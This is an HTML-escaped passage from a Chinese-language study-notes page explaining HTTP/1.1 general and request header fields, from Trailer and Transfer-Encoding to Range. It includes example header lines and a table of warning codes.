&lt;h4 id=&#34;Trailer&#34;&gt;&lt;a href=&#34;#Trailer&#34; class=&#34;headerlink&#34; title=&#34;Trailer&#34;&gt;&lt;/a&gt;Trailer&lt;/h4&gt;&lt;p&gt;首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;OK&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Tue, 03 Jul 2012 04:40:56 GMT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token text-html&#34;&gt;...
Transfer-Encoding: chunked
Trailer: Expires

...(报文主体)... 0
Expires: Tue, 28 Sep 2004 23:59:59 GMT&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。&lt;/p&gt;
&lt;h4 id=&#34;Transfer-Encoding&#34;&gt;&lt;a href=&#34;#Transfer-Encoding&#34; class=&#34;headerlink&#34; title=&#34;Transfer-Encoding&#34;&gt;&lt;/a&gt;Transfer-Encoding&lt;/h4&gt;&lt;p&gt;首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。&lt;/p&gt;
&lt;p&gt;HTTP/1.1 的传输编码方式仅对分块传输编码有效。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;OK&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Tue, 03 Jul 2012 04:40:56 GMT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cache-Control&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;public, max-age=604800 &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/javascript; charset=utf-8 &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Expires&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Tue, 10 Jul 2012 04:40:56 GMT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;DENY&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1; mode=block &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Transfer-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;chunked &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;keep-alive&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Upgrade&#34;&gt;&lt;a href=&#34;#Upgrade&#34; class=&#34;headerlink&#34; title=&#34;Upgrade&#34;&gt;&lt;/a&gt;Upgrade&lt;/h4&gt;&lt;p&gt;首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/c345255e4e1f7c71755193f3e9157b21.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。&lt;/p&gt;
&lt;p&gt;对于附有首部字段 Upgrade 的请求，服务器可用 101 Switching Protocols 状态码作为响应返回。&lt;/p&gt;
&lt;h4 id=&#34;Via&#34;&gt;&lt;a href=&#34;#Via&#34; class=&#34;headerlink&#34; title=&#34;Via&#34;&gt;&lt;/a&gt;Via&lt;/h4&gt;&lt;p&gt;使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/eb53ad7d905d8029eca3b989b9348508.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。&lt;/p&gt;
&lt;p&gt;1.0是指代理服务器的HTTP版本&lt;/p&gt;
&lt;h4 id=&#34;Warning&#34;&gt;&lt;a href=&#34;#Warning&#34; class=&#34;headerlink&#34; title=&#34;Warning&#34;&gt;&lt;/a&gt;Warning&lt;/h4&gt;&lt;p&gt;HTTP/1.1 的 Warning 首部是从 HTTP/1.0 的响应首部（Retry-After）演变过来的。该首部通常会告知用户一些与缓存相关的问题的警告。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;[警告码][警告的主机:端口号]“[警告内容]”([日期时间])&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;113 gw.hackr.jp:8080 &#34;Heuristic expiration&#34; Tue, 03&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;HTTP-1-1-警告码&#34;&gt;&lt;a href=&#34;#HTTP-1-1-警告码&#34; class=&#34;headerlink&#34; title=&#34;HTTP/1.1 警告码&#34;&gt;&lt;/a&gt;&lt;strong&gt;HTTP/1.1&lt;/strong&gt; 警告码&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;警告码&lt;/th&gt;
&lt;th&gt;警告内容&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;110&lt;/td&gt;
&lt;td&gt;Response  is stale（响应已过期）&lt;/td&gt;
&lt;td&gt;代理返回已过期的资源&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;111&lt;/td&gt;
&lt;td&gt;Revalidation  failed（再验证失败）&lt;/td&gt;
&lt;td&gt;代理再验证资源有效性时失败（服务器无法到达等原因）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;112&lt;/td&gt;
&lt;td&gt;Disconnection operation（断开连接操作）&lt;/td&gt;
&lt;td&gt;代理与互联网连接被故意切断&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;113&lt;/td&gt;
&lt;td&gt;Heuristic  expiration（试探性过期）&lt;/td&gt;
&lt;td&gt;响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;199&lt;/td&gt;
&lt;td&gt;Miscellaneous  warning（杂项警告）&lt;/td&gt;
&lt;td&gt;任意的警告内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;214&lt;/td&gt;
&lt;td&gt;Transformation  applied（使用了转换）&lt;/td&gt;
&lt;td&gt;代理对内容编码或媒体类型等执行了某些处理时&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;299&lt;/td&gt;
&lt;td&gt;Miscellaneous persistent  warning（持久杂项警告）&lt;/td&gt;
&lt;td&gt;任意的警告内容&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;请求首部字段-1&#34;&gt;&lt;a href=&#34;#请求首部字段-1&#34; class=&#34;headerlink&#34; title=&#34;请求首部字段&#34;&gt;&lt;/a&gt;请求首部字段&lt;/h3&gt;&lt;p&gt;请求首部字段是从客户端往服务器端发送请求报文中所使用的字段， 用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。&lt;/p&gt;
&lt;h4 id=&#34;Accept&#34;&gt;&lt;a href=&#34;#Accept&#34; class=&#34;headerlink&#34; title=&#34;Accept&#34;&gt;&lt;/a&gt;Accept&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/28a3ddf597307b46dbfd4f5fcaa59bc6.png&#34;&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.1&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;文本文件&lt;/p&gt;
&lt;p&gt;text/html, text/plain, text/css … &lt;/p&gt;
&lt;p&gt;application/xhtml+xml, application/xml …&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;图片文件&lt;/p&gt;
&lt;p&gt;image/jpeg, image/gif, image/png …&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;视频文件&lt;/p&gt;
&lt;p&gt;video/mpeg, video/quicktime …&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;应用程序使用的二进制文件&lt;/p&gt;
&lt;p&gt;application/octet-stream, application/zip …&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。&lt;/p&gt;
&lt;p&gt;若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值1，用分（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。&lt;/p&gt;
&lt;h4 id=&#34;Accept-Charset&#34;&gt;&lt;a href=&#34;#Accept-Charset&#34; class=&#34;headerlink&#34; title=&#34;Accept-Charset&#34;&gt;&lt;/a&gt;Accept-Charset&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/c4e11a52cebd529f557a2167802d9ffc.png&#34;&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Charset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;iso-8859-5, unicode-1-1;q=0.8&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Accept-Encoding&#34;&gt;&lt;a href=&#34;#Accept-Encoding&#34; class=&#34;headerlink&#34; title=&#34;Accept-Encoding&#34;&gt;&lt;/a&gt;Accept-Encoding&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip, deflate&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gzip&lt;/li&gt;
&lt;li&gt;compress&lt;/li&gt;
&lt;li&gt;deflate&lt;/li&gt;
&lt;li&gt;identity&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也能使用权重q，使用&lt;code&gt;*&lt;/code&gt;作为通配符&lt;/p&gt;
&lt;h4 id=&#34;Accept-Language&#34;&gt;&lt;a href=&#34;#Accept-Language&#34; class=&#34;headerlink&#34; title=&#34;Accept-Language&#34;&gt;&lt;/a&gt;Accept-Language&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;zh-cn,zh;q=0.7,en-us,en;q=0.3&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。&lt;/p&gt;
&lt;h4 id=&#34;Authorization&#34;&gt;&lt;a href=&#34;#Authorization&#34; class=&#34;headerlink&#34; title=&#34;Authorization&#34;&gt;&lt;/a&gt;Authorization&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/b03ee40399dfa19fd529932d4b425bf2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。&lt;/p&gt;
&lt;h4 id=&#34;Expect&#34;&gt;&lt;a href=&#34;#Expect&#34; class=&#34;headerlink&#34; title=&#34;Expect&#34;&gt;&lt;/a&gt;Expect&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/505b2dc20140f2229009f7b1d50c6003.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。&lt;/p&gt;
&lt;p&gt;客户端可以利用该首部字段，写明所期望的扩展。&lt;/p&gt;
&lt;h4 id=&#34;From&#34;&gt;&lt;a href=&#34;#From&#34; class=&#34;headerlink&#34; title=&#34;From&#34;&gt;&lt;/a&gt;From&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/7eab6c8381ea2f0dfc218ee7b8bd0917.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。&lt;/p&gt;
&lt;h4 id=&#34;Host&#34;&gt;&lt;a href=&#34;#Host&#34; class=&#34;headerlink&#34; title=&#34;Host&#34;&gt;&lt;/a&gt;Host&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;www.hackr.jp&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请求内的首部字段。&lt;/p&gt;
&lt;p&gt;虚拟主机运行在同一个 &lt;strong&gt;IP&lt;/strong&gt; 上，因此使用首部字段 &lt;strong&gt;Host&lt;/strong&gt; 加以区分&lt;/p&gt;
&lt;p&gt;若服务器未设定主机名，那直接发送一个空值即可。&lt;/p&gt;
&lt;h4 id=&#34;If-XXX&#34;&gt;&lt;a href=&#34;#If-XXX&#34; class=&#34;headerlink&#34; title=&#34;If-XXX&#34;&gt;&lt;/a&gt;If-XXX&lt;/h4&gt;&lt;p&gt;形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/882524fadb21c8271d082b988d4bc4fe.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;If-Match&#34;&gt;&lt;a href=&#34;#If-Match&#34; class=&#34;headerlink&#34; title=&#34;If-Match&#34;&gt;&lt;/a&gt;If-Match&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;If-Match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;&#34;123456&#34;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。&lt;/p&gt;
&lt;p&gt;服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。&lt;/p&gt;
&lt;p&gt;通配符&lt;code&gt;*&lt;/code&gt;跳过匹配&lt;/p&gt;
&lt;h4 id=&#34;If-Modified-Since&#34;&gt;&lt;a href=&#34;#If-Modified-Since&#34; class=&#34;headerlink&#34; title=&#34;If-Modified-Since&#34;&gt;&lt;/a&gt;If-Modified-Since&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;If-Modified-Since&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Thu, 15 Apr 2004 00:00:00 GMT&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 If- Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。&lt;/p&gt;
&lt;p&gt;If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。&lt;/p&gt;
&lt;h4 id=&#34;If-None-Match&#34;&gt;&lt;a href=&#34;#If-None-Match&#34; class=&#34;headerlink&#34; title=&#34;If-None-Match&#34;&gt;&lt;/a&gt;If-None-Match&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/7443e192d3075d7a42155c0632ce4c06.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;它和首部字段 If-Match 作用相反。&lt;/p&gt;
&lt;p&gt;在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。&lt;/p&gt;
&lt;h4 id=&#34;If-Range&#34;&gt;&lt;a href=&#34;#If-Range&#34; class=&#34;headerlink&#34; title=&#34;If-Range&#34;&gt;&lt;/a&gt;If-Range&lt;/h4&gt;&lt;p&gt;首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If- Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/9e0a6505cd35db6f7beb949d933106cc.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d82cef8fcce80a19ce1cbcbc522d76b8.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;If-Unmodified-Since&#34;&gt;&lt;a href=&#34;#If-Unmodified-Since&#34; class=&#34;headerlink&#34; title=&#34;If-Unmodified-Since&#34;&gt;&lt;/a&gt;If-Unmodified-Since&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;If-Unmodified-Since&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Thu, 03 Jul 2012 00:00:00 GMT&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。&lt;/p&gt;
&lt;h4 id=&#34;Max-Forwards&#34;&gt;&lt;a href=&#34;#Max-Forwards&#34; class=&#34;headerlink&#34; title=&#34;Max-Forwards&#34;&gt;&lt;/a&gt;Max-Forwards&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/58c2400eb309d5ef98d5a565925de4b3.png&#34;&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Max-Forwards&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;每次转发数值减 &lt;strong&gt;1&lt;/strong&gt;。当数值变 &lt;strong&gt;0&lt;/strong&gt; 时返回响应&lt;/p&gt;
&lt;p&gt;通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 Max- Forwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。&lt;/p&gt;
&lt;h4 id=&#34;Proxy-Authorization&#34;&gt;&lt;a href=&#34;#Proxy-Authorization&#34; class=&#34;headerlink&#34; title=&#34;Proxy-Authorization&#34;&gt;&lt;/a&gt;Proxy-Authorization&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Proxy-Authorization&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Basic dGlwOjkpNLAGfFY5&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。&lt;/p&gt;
&lt;h4 id=&#34;Range&#34;&gt;&lt;a href=&#34;#Range&#34; class=&#34;headerlink&#34; title=&#34;Range&#34;&gt;&lt;/a&gt;Range&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes=5001-10000&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。&lt;/p&gt;
